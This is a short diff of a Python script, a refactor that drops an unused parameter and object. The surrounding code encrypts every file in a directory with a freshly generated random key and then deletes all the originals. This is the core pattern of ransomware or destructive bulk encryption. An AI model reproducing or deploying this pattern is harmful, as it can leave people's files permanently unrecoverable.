@@ -8,7 +8,7 @@ def makeDir(path_name):
     if not os.path.exists(path_name):
         os.mkdir(path_name)
 
-def encrypt_file(key, in_filename, randomObj, chunksize=64*1024):
+def encrypt_file(key, in_filename, chunksize=64*1024):
 
     file_name = in_filename.split('.')[0]
     out_filename = ENC_DIR_PATH + file_name + ".enc"
@@ -42,10 +42,9 @@ def entry():
     makeDir(ENC_DIR_PATH)
     try:
         files = os.listdir(DIR_PATH)
-        random_Obj = dataQueue()
         key = bytes(os.urandom(16))
         for file in files:
-            encrypt_file(key, file, random_Obj)
+            encrypt_file(key, file)
 
         for file in files:
             os.remove(DIR_PATH+file)
